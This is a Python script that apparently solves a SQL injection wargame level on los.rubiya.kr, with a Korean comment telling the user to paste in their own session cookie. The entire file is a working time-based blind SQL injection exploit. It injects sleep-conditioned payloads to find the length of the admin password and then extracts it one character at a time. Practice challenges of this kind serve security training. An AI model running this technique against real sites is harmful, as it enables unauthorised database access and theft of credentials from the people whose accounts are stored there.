import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?"
cookie = {"PHPSESSID":"YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ans = ''

for i in range(1,100):
    query = "pw=' or id='admin' and if(length(pw)={},sleep(3),0)%23".format(i)
    pre = time.time()
    requests.get(url+query, cookies=cookie)
    #print(url+payload)
    print(url+query)
    post = time.time()
    if(post-pre>3):
        length = i
        print("length :", length)
        break

for i in range(1, length+1):
    for j in range(33,127):
        query = "pw=' or id='admin' and if(substr(pw,{},1)={},sleep(3),0)%23".format(i,hex(j))
        pre = time.time()
        requests.get(url+query, cookies=cookie)
        print(url+query)
        post = time.time()
        if(post-pre>3):
            ans += chr(j)
            print(chr(j))
            break

print("pw: "+ans)
            
